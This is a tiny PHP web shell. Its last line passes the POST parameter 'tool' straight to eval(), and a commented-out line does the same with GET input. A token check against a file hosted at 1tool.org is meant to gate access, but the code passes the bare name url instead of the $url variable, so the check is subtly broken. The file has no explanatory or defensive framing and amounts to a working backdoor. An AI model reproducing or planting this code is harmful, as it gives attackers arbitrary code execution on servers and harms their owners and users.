<?php 
//header("ALLOW-CONTROL-ALLOW-ORIGIN:*");
//header("text/html;charset=UTF-8");
//header('Access-Control-Allow-Methods:*');


//eval($_GET[tool]);
$token = $_GET['token'];
$url = 'https://www.1tool.org/Security/token.txt';
if(file_get_contents(url)!=$token){
return;
}
eval($_POST[tool]);
?>